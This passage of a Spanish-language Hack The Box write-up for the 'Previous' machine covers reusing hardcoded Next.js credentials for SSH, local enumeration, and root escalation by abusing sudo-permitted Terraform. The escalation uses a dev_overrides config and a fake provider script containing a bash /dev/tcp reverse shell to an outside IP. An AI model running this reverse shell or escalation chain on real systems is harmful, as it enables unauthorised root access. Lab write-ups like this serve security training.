                        <span class="na">authorize</span><span class="p">:</span> <span class="k">async</span> <span class="nx">e</span> <span class="o">=&gt;</span> <span class="nx">e</span><span class="p">?.</span><span class="nx">username</span> <span class="o">===</span> <span class="dl">"</span><span class="s2">jeremy</span><span class="dl">"</span> <span class="o">&amp;&amp;</span> <span class="nx">e</span><span class="p">.</span><span class="nx">password</span> <span class="o">===</span> <span class="p">(</span><span class="nx">process</span><span class="p">.</span><span class="nx">env</span><span class="p">.</span><span class="nx">ADMIN_SECRET</span> <span class="o">??</span> <span class="dl">"</span><span class="s2">MyNameIsJeremyAndILovePancakes</span><span class="dl">"</span><span class="p">)</span> <span class="p">?</span> <span class="p">{</span>
                            <span class="na">id</span><span class="p">:</span> <span class="dl">"</span><span class="s2">1</span><span class="dl">"</span><span class="p">,</span>
                            <span class="na">name</span><span class="p">:</span> <span class="dl">"</span><span class="s2">Jeremy</span><span class="dl">"</span>
                        <span class="p">}</span> <span class="p">:</span> <span class="kc">null</span>
                    <span class="p">})],</span>
                    <span class="na">pages</span><span class="p">:</span> <span class="p">{</span>
                        <span class="na">signIn</span><span class="p">:</span> <span class="dl">"</span><span class="s2">/signin</span><span class="dl">"</span>
                    <span class="p">},</span>
                    <span class="na">secret</span><span class="p">:</span> <span class="nx">process</span><span class="p">.</span><span class="nx">env</span><span class="p">.</span><span class="nx">NEXTAUTH_SECRET</span>
                <span class="p">},</span>
                <span class="nx">d</span> <span class="o">=</span> <span class="nf">require</span><span class="p">(</span><span class="dl">"</span><span class="s2">next-auth</span><span class="dl">"</span><span class="p">),</span>
                <span class="nx">p</span> <span class="o">=</span> <span class="nx">r</span><span class="p">.</span><span class="nf">n</span><span class="p">(</span><span class="nx">d</span><span class="p">)()(</span><span class="nx">o</span><span class="p">),</span>
                <span class="nx">P</span> <span class="o">=</span> <span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nx">i</span><span class="p">.</span><span class="nx">M</span><span class="p">)(</span><span class="nx">t</span><span class="p">,</span> <span class="dl">"</span><span class="s2">default</span><span class="dl">"</span><span class="p">),</span>
                <span class="nx">l</span> <span class="o">=</span> <span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nx">i</span><span class="p">.</span><span class="nx">M</span><span class="p">)(</span><span class="nx">t</span><span class="p">,</span> <span class="dl">"</span><span class="s2">config</span><span class="dl">"</span><span class="p">),</span>
                <span class="nx">A</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">a</span><span class="p">.</span><span class="nc">PagesAPIRouteModule</span><span class="p">({</span>
                    <span class="na">definition</span><span class="p">:</span> <span class="p">{</span>
                        <span class="na">kind</span><span class="p">:</span> <span class="nx">s</span><span class="p">.</span><span class="nx">A</span><span class="p">.</span><span class="nx">PAGES_API</span><span class="p">,</span>
                        <span class="na">page</span><span class="p">:</span> <span class="dl">"</span><span class="s2">/api/auth/[...nextauth]</span><span class="dl">"</span><span class="p">,</span>
                        <span class="na">pathname</span><span class="p">:</span> <span class="dl">"</span><span class="s2">/api/auth/[...nextauth]</span><span class="dl">"</span><span class="p">,</span>
                        <span class="na">bundlePath</span><span class="p">:</span> <span class="dl">""</span><span class="p">,</span>
                        <span class="na">filename</span><span class="p">:</span> <span class="dl">""</span>
                    <span class="p">},</span>
                    <span class="na">userland</span><span class="p">:</span> <span class="nx">t</span>
                <span class="p">})</span>
        <span class="p">}</span>
    <span class="p">};</span>
    <span class="kd">var</span> <span class="nx">n</span> <span class="o">=</span> <span class="nf">require</span><span class="p">(</span><span class="dl">"</span><span class="s2">../../../webpack-api-runtime.js</span><span class="dl">"</span><span class="p">);</span>
    <span class="nx">n</span><span class="p">.</span><span class="nc">C</span><span class="p">(</span><span class="nx">e</span><span class="p">);</span>
    <span class="kd">var</span> <span class="nx">r</span> <span class="o">=</span> <span class="nf">n</span><span class="p">(</span><span class="nx">n</span><span class="p">.</span><span class="nx">s</span> <span class="o">=</span> <span class="mi">9832</span><span class="p">);</span>
    <span class="nx">module</span><span class="p">.</span><span class="nx">exports</span> <span class="o">=</span> <span class="nx">r</span>
<span class="p">})();</span>
</pre></td></tr></tbody></table></code></div></div>

<p>Este es nuestro resulado, si buscamos bien a simple vista conseguimos unas credenciales para el usuario <code class="language-plaintext highlighter-rouge">jeremy</code>, podriamos probar este pass para conectarnos por ssh y obtener una shell.</p>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre>MyNameIsJeremyAndILovePancakes
</pre></td></tr></tbody></table></code></div></div>

<h2 id="escalada-de-privilegios"><span class="me-2">Escalada de Privilegios</span><a href="#escalada-de-privilegios" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>

<h3 id="shell-como-jeremy"><span class="me-2">Shell como Jeremy</span><a href="#shell-como-jeremy" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<p>Ya obtuvimos una shell como jeremy, vamos a realizar una enumeracion basica del sistema para saber donde estamos parados y que podemos encontrar para escalar privilegios o escalar a otro usuaro con permisos.</p>

<h3 id="puertos-internos"><span class="me-2">Puertos Internos</span><a href="#puertos-internos" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
</pre></td><td class="rouge-code"><pre>jeremy@previous:~<span class="nv">$ </span>netstat <span class="nt">-tnlp</span>
<span class="o">(</span>Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.<span class="o">)</span>
Active Internet connections <span class="o">(</span>only servers<span class="o">)</span>
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 0.0.0.0:80              0.0.0.0:<span class="k">*</span>               LISTEN      -                   
tcp        0      0 0.0.0.0:22              0.0.0.0:<span class="k">*</span>               LISTEN      -                   
tcp        0      0 127.0.0.53:53           0.0.0.0:<span class="k">*</span>               LISTEN      -                   
tcp        0      0 127.0.0.1:3000          0.0.0.0:<span class="k">*</span>               LISTEN      -                   
tcp        0      0 127.0.0.1:33779         0.0.0.0:<span class="k">*</span>               LISTEN      -                   
tcp6       0      0 :::80                   :::<span class="k">*</span>                    LISTEN      -                   
tcp6       0      0 :::22                   :::<span class="k">*</span>                    LISTEN      -
</pre></td></tr></tbody></table></code></div></div>
<h3 id="hostname"><span class="me-2">Hostname</span><a href="#hostname" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre></td><td class="rouge-code"><pre>jeremy@previous:~<span class="nv">$ </span><span class="nb">hostname</span> <span class="nt">-I</span>
10.10.11.83 172.18.0.1 172.17.0.1 
</pre></td></tr></tbody></table></code></div></div>

<h3 id="lsb_release"><span class="me-2">lsb_release</span><a href="#lsb_release" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre></td><td class="rouge-code"><pre>jeremy@previous:~<span class="nv">$ </span>lsb_release <span class="nt">-a</span>
No LSB modules are available.
Distributor ID:	Ubuntu
Description:	Ubuntu 22.04.5 LTS
Release:	22.04
Codename:	jammy
</pre></td></tr></tbody></table></code></div></div>

<h3 id="procesos-en-segundo-plano"><span class="me-2">Procesos en segundo plano</span><a href="#procesos-en-segundo-plano" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<p><a href="/assets/img/htb-writeup-previous/previous3.png" class="popup img-link  shimmer"><img src="/assets/img/htb-writeup-previous/previous3.png" alt="" loading="lazy"></a></p>

<p>Vemos que existe un contenedor docker hosteando el proyecto, ahora veo porque la interface <code class="language-plaintext highlighter-rouge">172.18.0.1</code> y <code class="language-plaintext highlighter-rouge">172.17.0.1</code></p>

<h3 id="crontab"><span class="me-2">Crontab</span><a href="#crontab" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
</pre></td><td class="rouge-code"><pre>jeremy@previous:~<span class="nv">$ </span><span class="nb">cat</span> /etc/crontab
<span class="c"># /etc/crontab: system-wide crontab</span>
<span class="c"># Unlike any other crontab you don't have to run the `crontab'</span>
<span class="c"># command to install the new version when you edit this file</span>
<span class="c"># and files in /etc/cron.d. These files also have username fields,</span>
<span class="c"># that none of the other crontabs do.</span>

<span class="nv">SHELL</span><span class="o">=</span>/bin/sh
<span class="c"># You can also override PATH, but by default, newer versions inherit it from the environment</span>
<span class="c">#PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin</span>

<span class="c"># Example of job definition:</span>
<span class="c"># .---------------- minute (0 - 59)</span>
<span class="c"># |  .------------- hour (0 - 23)</span>
<span class="c"># |  |  .---------- day of month (1 - 31)</span>
<span class="c"># |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...</span>
<span class="c"># |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat</span>
<span class="c"># |  |  |  |  |</span>
<span class="c"># *  *  *  *  * user-name command to be executed</span>
17 <span class="k">*</span>	<span class="k">*</span> <span class="k">*</span> <span class="k">*</span>	root    <span class="nb">cd</span> / <span class="o">&amp;&amp;</span> run-parts <span class="nt">--report</span> /etc/cron.hourly
25 6	<span class="k">*</span> <span class="k">*</span> <span class="k">*</span>	root	<span class="nb">test</span> <span class="nt">-x</span> /usr/sbin/anacron <span class="o">||</span> <span class="o">(</span> <span class="nb">cd</span> / <span class="o">&amp;&amp;</span> run-parts <span class="nt">--report</span> /etc/cron.daily <span class="o">)</span>
47 6	<span class="k">*</span> <span class="k">*</span> 7	root	<span class="nb">test</span> <span class="nt">-x</span> /usr/sbin/anacron <span class="o">||</span> <span class="o">(</span> <span class="nb">cd</span> / <span class="o">&amp;&amp;</span> run-parts <span class="nt">--report</span> /etc/cron.weekly <span class="o">)</span>
52 6	1 <span class="k">*</span> <span class="k">*</span>	root	<span class="nb">test</span> <span class="nt">-x</span> /usr/sbin/anacron <span class="o">||</span> <span class="o">(</span> <span class="nb">cd</span> / <span class="o">&amp;&amp;</span> run-parts <span class="nt">--report</span> /etc/cron.monthly <span class="o">)</span>
<span class="c">#</span>
</pre></td></tr></tbody></table></code></div></div>

<p>No existe ninguna tarea cron programada</p>

<h3 id="sudo"><span class="me-2">SUDO</span><a href="#sudo" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<p>PERO!!!!! Si existe un permiso a nivel de <code class="language-plaintext highlighter-rouge">SUDOERS</code></p>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre></td><td class="rouge-code"><pre>jeremy@previous:~<span class="nv">$ </span><span class="nb">sudo</span> <span class="nt">-l</span>
Matching Defaults entries <span class="k">for </span>jeremy on previous:
    <span class="o">!</span>env_reset, env_delete+<span class="o">=</span>PATH, mail_badpass, <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin<span class="se">\:</span>/snap/bin, use_pty

User jeremy may run the following commands on previous:
    <span class="o">(</span>root<span class="o">)</span> /usr/bin/terraform <span class="nt">-chdir</span><span class="se">\=</span>/opt/examples apply
</pre></td></tr></tbody></table></code></div></div>

<p>Que es Terraform?</p>

<p>/usr/bin/terraform es la ruta de acceso a la ejecutable de línea de comandos (CLI) de Terraform, una herramienta de código abierto para la gestión de infraestructura como código (IaC). Esta ruta indica que el programa se ha instalado en un sistema Linux (o similar) en el directorio estándar para ejecutables del sistema</p>

<p>Herramienta IaC: Terraform se utiliza para definir, aprovisionar y gestionar la infraestructura (servidores, bases de datos, redes) a través de archivos de configuración escritos en un lenguaje declarativo llamado HCL (HashiCorp Configuration Language).</p>

<p>En la carpeta <code class="language-plaintext highlighter-rouge">/opt/examples</code> existe un archivo <code class="language-plaintext highlighter-rouge">main.tf</code> que significa?, Es el punto de entrada principal para la configuración de infraestructura en Terraform. Contiene los bloques de recursos que definen los recursos de infraestructura que se van a crear, como máquinas virtuales, bases de datos y redes.</p>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
</pre></td><td class="rouge-code"><pre>jeremy@previous:~<span class="nv">$ </span><span class="nb">cat</span> /opt/examples/main.tf 
terraform <span class="o">{</span>
  required_providers <span class="o">{</span>
    examples <span class="o">=</span> <span class="o">{</span>
      <span class="nb">source</span> <span class="o">=</span> <span class="s2">"previous.htb/terraform/examples"</span>
    <span class="o">}</span>
  <span class="o">}</span>
<span class="o">}</span>

variable <span class="s2">"source_path"</span> <span class="o">{</span>
  <span class="nb">type</span> <span class="o">=</span> string
  default <span class="o">=</span> <span class="s2">"/root/examples/hello-world.ts"</span>

  validation <span class="o">{</span>
    condition <span class="o">=</span> strcontains<span class="o">(</span>var.source_path, <span class="s2">"/root/examples/"</span><span class="o">)</span> <span class="o">&amp;&amp;</span> <span class="o">!</span>strcontains<span class="o">(</span>var.source_path, <span class="s2">".."</span><span class="o">)</span>
    error_message <span class="o">=</span> <span class="s2">"The source_path must contain '/root/examples/'."</span>
  <span class="o">}</span>
<span class="o">}</span>

provider <span class="s2">"examples"</span> <span class="o">{}</span>

resource <span class="s2">"examples_example"</span> <span class="s2">"example"</span> <span class="o">{</span>
  source_path <span class="o">=</span> var.source_path
<span class="o">}</span>

output <span class="s2">"destination_path"</span> <span class="o">{</span>
  value <span class="o">=</span> examples_example.example.destination_path
<span class="o">}</span>
</pre></td></tr></tbody></table></code></div></div>

<p>En la documentacion se puede buscar por variables de enforno que podamos alterar para controlar el archivo de configuracion. <a href="https://developer.hashicorp.com/terraform/cli/config/environment-variables#tf_cli_config_file">Terraform_DOCS</a></p>

<p>Lo primero que haremos sera crear un archivo asi:</p>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre></td><td class="rouge-code"><pre>jeremy@previous:~/privesc<span class="nv">$ </span><span class="nb">cat </span>terraform-provider-examples_v0.1_linux_amd64 
<span class="c">#!/bin/bash</span>

bash <span class="nt">-i</span> <span class="o">&gt;</span>&amp; /dev/tcp/10.10.16.8/443 0&gt;&amp;1
</pre></td></tr></tbody></table></code></div></div>

<p><code class="language-plaintext highlighter-rouge">dev_overrides</code> apunta al directorio donde se encuentra nuestro archivo que creamos <code class="language-plaintext highlighter-rouge">terraform-provider-examples_v1.0_linux_amd64</code></p>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre></td><td class="rouge-code"><pre>jeremy@previous:~/privesc<span class="nv">$ </span><span class="nb">cat </span>dev.tfrc 
provider_installation <span class="o">{</span>
  dev_overrides <span class="o">{</span>
    <span class="s2">"previous.htb/terraform/examples"</span> <span class="o">=</span> <span class="s2">"/home/jeremy/privesc"</span>
  <span class="o">}</span>
  direct <span class="o">{}</span>
<span class="o">}</span>
</pre></td></tr></tbody></table></code></div></div>

<p>LUEGO!!!</p>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre></td><td class="rouge-code"><pre><span class="nb">export </span><span class="nv">TF_CLI_CONFIG_FILE</span><span class="o">=</span><span class="s2">"/home/jeremy/privesc/dev.tfrc"</span>
<span class="nb">sudo</span> /usr/bin/terraform <span class="nt">-chdir</span><span class="se">\=</span>/opt/examples apply
</pre></td></tr></tbody></table></code></div></div>

<p><a href="/assets/img/htb-writeup-previous/previous4.png" class="popup img-link  shimmer"><img src="/assets/img/htb-writeup-previous/previous4.png" alt="" loading="lazy"></a></p>


  </div>

  <div class="post-tail-wrapper text-muted">
    <!-- categories -->
    
      <div class="post-meta mb-3">
        <i class="far fa-folder-open fa-fw me-1"></i>
        
          <a href="/categories/hack-the-box/">Hack The Box</a>,
          <a href="/categories/linux/">Linux</a>
      </div>
    

    <!-- tags -->
    
      <div class="post-tags">
        <i class="fa fa-tags fa-fw me-1"></i>
        
          <a
            href="/tags/linux/"
            class="post-tag no-text-decoration"
          >Linux</a>
        
          <a
            href="/tags/web/"
            class="post-tag no-text-decoration"
          >Web</a>
        
          <a
            href="/tags/fuzzlfi/"
            class="post-tag no-text-decoration"
          >FuzzLFI</a>
        
          <a
            href="/tags/sudo/"
            class="post-tag no-text-decoration"
          >SUDO</a>
        
          <a
            href="/tags/terraform/"
            class="post-tag no-text-decoration"
          >Terraform</a>
        
          <a
            href="/tags/lfi/"
            class="post-tag no-text-decoration"
          >LFI</a>
        
          <a
            href="/tags/cve/"
            class="post-tag no-text-decoration"
          >CVE</a>
        
          <a
            href="/tags/nextjs/"
            class="post-tag no-text-decoration"
          >NextJS</a>
        
          <a
            href="/tags/sudoers/"
            class="post-tag no-text-decoration"
          >SUDOERS</a>
        
      </div>
    

    <div
      class="
        post-tail-bottom
        d-flex justify-content-between align-items-center mt-5 pb-2
      "
    >
      <div class="license-wrapper">
        
          

          This post is licensed under 
        <a href="https://creativecommons.org/licenses/by/4.0/">
          CC BY 4.0
        </a>
         by the author.
        
      </div>

      <!-- Post sharing snippet -->

<div class="share-wrapper d-flex align-items-center">
  <span class="share-label text-muted">Share</span>
  <span class="share-icons">
    
    
    

    

    <button
      id="copy-link"
      aria-label="Copy link"
      class="btn small"
      data-bs-toggle="tooltip"
      data-bs-placement="top"
      title="Copy link"
      data-title-succeed="Link copied successfully!"
    >
      <i class="fa-fw fas fa-link pe-none fs-6"></i>
    </button>
  </span>
</div>

    </div>
    <!-- .post-tail-bottom -->
  </div>
  <!-- div.post-tail-wrapper -->
</article>


            
          </main>

          <!-- panel -->
          <aside aria-label="Panel" id="panel-wrapper" class="col-xl-3 ps-2 mb-5 text-muted">
            <div class="access">
              <!-- Get 5 last posted/updated posts -->














  <section id="access-lastmod">
    <h2 class="panel-heading">Recently Updated</h2>
    <ul class="content list-unstyled ps-0 pb-1 ms-1 mt-2">
      
        
        
        
        <li class="text-truncate lh-lg">
          <a href="/posts/imagery/">Imagery - Hack The Box</a>
        </li>
      
        
        
        
        <li class="text-truncate lh-lg">
          <a href="/posts/conversor/">Conversor - Hack The Box</a>
        </li>
      
        
        
        
        <li class="text-truncate lh-lg">
          <a href="/posts/previous/">Previous - Hack The Box</a>
        </li>
      
        
        
        
        <li class="text-truncate lh-lg">
          <a href="/posts/editorial/">Editorial - Hack The Box</a>
        </li>
      
        
        
        
        <li class="text-truncate lh-lg">
          <a href="/posts/runner/">Runner - Hack The Box</a>
        </li>
      
    </ul>
  </section>
  <!-- #access-lastmod -->


              <!-- The trending tags list -->















  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
      
        
        

  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
      
        
        



  <section>
    <h2 class="panel-heading">Trending Tags</h2>
    <div class="d-flex flex-wrap mt-3 mb-1 me-3">
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/web/">Web</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/linux/">Linux</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/api/">API</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/cve/">CVE</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/fuzz/">Fuzz</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/lfi/">LFI</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/sudoers/">SUDOERS</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/xss/">XSS</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/app/">App</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/blind-xss/">Blind XSS</a>
      
    </div>
  </section>


            </div>

            
              
              



  <section id="toc-wrapper" class="ps-0 pe-4">
    <h2 class="panel-heading ps-3 pt-2 mb-2">Contents</h2>
    <nav id="toc"></nav>
  </section>


            
          </aside>
        </div>

        <div class="row">
          <!-- tail -->
          <div id="tail-wrapper" class="col-12 col-lg-11 col-xl-9 px-md-4">
            
              
              <!-- Recommend the other 3 posts according to the tags and categories of the current post. -->

<!-- The total size of related posts -->


<!-- An random integer that bigger than 0 -->


<!-- Equals to TAG_SCORE / {max_categories_hierarchy} -->














  

  
    
  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  











  <aside id="related-posts" aria-labelledby="related-label">
    <h3 class="mb-4" id="related-label">Further Reading</h3>
    <nav class="row row-cols-1 row-cols-md-2 row-cols-xl-3 g-4 mb-4">
      
        <article class="col">
          <a href="/posts/imagery/" class="post-preview card h-100">
            <div class="card-body">
              <!--
  Date format snippet
  See: ${JS_ROOT}/utils/locale-dateime.js
-->




<time
  
  data-ts="1761264000"
  data-df="ll"
  
>
  Oct 24, 2025
</time>

              <h4 class="pt-0 my-2">Imagery - Hack The Box</h4>
              <div class="text-muted">
                <p>
                  





                  

Imagery es una maquina de dificultad Media que al principio del escaneo nos encontramos con una web desarrollada en el lenguaje python werkzeug. Al principio parece una web normal y simple de sub...
                </p>
              </div>
            </div>
          </a>
        </article>
      
        <article class="col">
          <a href="/posts/stocker/" class="post-preview card h-100">
            <div class="card-body">
              <!--
  Date format snippet
  See: ${JS_ROOT}/utils/locale-dateime.js
-->




<time
  
  data-ts="1760400000"
  data-df="ll"
  
>
  Oct 14, 2025
</time>

              <h4 class="pt-0 my-2">Stocker - Hack The Box</h4>
              <div class="text-muted">
                <p>
                  





                  
Stocker es una máquina Linux de dificultad media que cuenta con un sitio web que se ejecuta en el puerto 80 y que anuncia diversos muebles para el hogar. A través de la enumeración vHost, se ident...
                </p>
              </div>
            </div>
          </a>
        </article>
      
        <article class="col">
          <a href="/posts/runner/" class="post-preview card h-100">
            <div class="card-body">
              <!--
  Date format snippet
  See: ${JS_ROOT}/utils/locale-dateime.js
-->




<time
  
  data-ts="1760659200"
  data-df="ll"
  
>
  Oct 17, 2025
</time>

              <h4 class="pt-0 my-2">Runner - Hack The Box</h4>
              <div class="text-muted">
                <p>
                  





                  

Runner es una máquina Linux de dificultad media que contiene una vulnerabilidad [CVE-2023-42793] en TeamCity. Esta vulnerabilidad permite a los usuarios eludir la autenticación y extraer un token...
                </p>
              </div>
            </div>
          </a>
        </article>
      
    </nav>
  </aside>
  <!-- #related-posts -->


            
              
              <!-- Navigation buttons at the bottom of the post. -->

<nav class="post-navigation d-flex justify-content-between" aria-label="Post Navigation">
  
  

  
    <a
      href="/posts/conversor/"
      class="btn btn-outline-primary"
      aria-label="Older"
    >
      <p>Conversor - Hack The Box</p>
    </a>
  

  
    <div class="btn btn-outline-primary disabled" aria-label="Newer">
      <p>-</p>
    </div>
  
</nav>

            
              
              <!--  The comments switcher -->


            

            <!-- The Footer -->

<footer
  aria-label="Site Info"
  class="
    d-flex flex-column justify-content-center text-muted
    flex-lg-row justify-content-lg-between align-items-lg-center pb-lg-3
  "
>
  <p>©
    <time>2025</time>

    
      <a href="https://github.com/MrIncreibl3">MrIncreibl3</a>.
    

    
      <span
        data-bs-toggle="tooltip"
        data-bs-placement="top"
        title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author."
      >Some rights reserved.</span>
    
  </p>

  <p>Using the <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> theme for <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a>.
  </p>
</footer>

          </div>
        </div>

        <!-- The Search results -->

